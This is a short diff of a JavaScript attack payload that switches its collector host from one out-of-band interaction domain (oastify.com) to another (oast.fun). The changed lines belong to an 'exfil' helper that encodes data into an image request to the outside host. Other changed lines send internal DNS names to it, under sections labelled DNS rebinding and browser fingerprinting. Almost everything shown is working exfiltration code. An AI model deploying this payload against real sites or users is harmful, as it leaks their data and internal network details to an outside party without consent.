@@ -13,7 +13,7 @@
   // Reliable exfil method using <img> (no CORS/preflight issues)
   const exfil = (path, data) => {
     const img = new Image();
-    img.src = 'http://mrh40py5wuchhu7dgjl0069vxm3dr5fu.oastify.com' + path + '?d=' + encodeURIComponent(data);
+    img.src = 'http://qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun' + path + '?d=' + encodeURIComponent(data);
   };
 
   // === [1] DNS Rebinding / Internal Resolution Test ===
@@ -28,7 +28,7 @@
 
   internalDnsNames.forEach(name => {
     let img = new Image();
-    img.src = 'http://' + name + '.mrh40py5wuchhu7dgjl0069vxm3dr5fu.oastify.com/ping';
+    img.src = 'http://' + name + '.qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun/ping';
   });
 
   // === [2] Browser Fingerprinting ===
